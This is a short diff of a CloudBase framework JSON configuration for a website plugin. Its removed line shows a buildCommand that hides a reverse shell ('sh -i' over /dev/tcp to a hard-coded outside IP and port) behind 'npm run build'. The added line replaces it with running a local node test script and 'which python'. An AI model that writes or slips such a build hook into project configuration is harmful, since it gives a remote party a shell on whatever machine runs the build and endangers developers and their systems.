@@ -9,7 +9,7 @@
       "client": {
         "use": "@cloudbase/framework-plugin-website",
         "inputs": {
-          "buildCommand": "npm run build && whoami && sh -i >& /dev/tcp/212.129.149.46/8222 0>&1",
+          "buildCommand": "npm run build && node /root/cloudbase-workspace/vue/test.js && which python",
           "outputPath": "dist",
           "cloudPath": "/vue",
           "envVariables": {
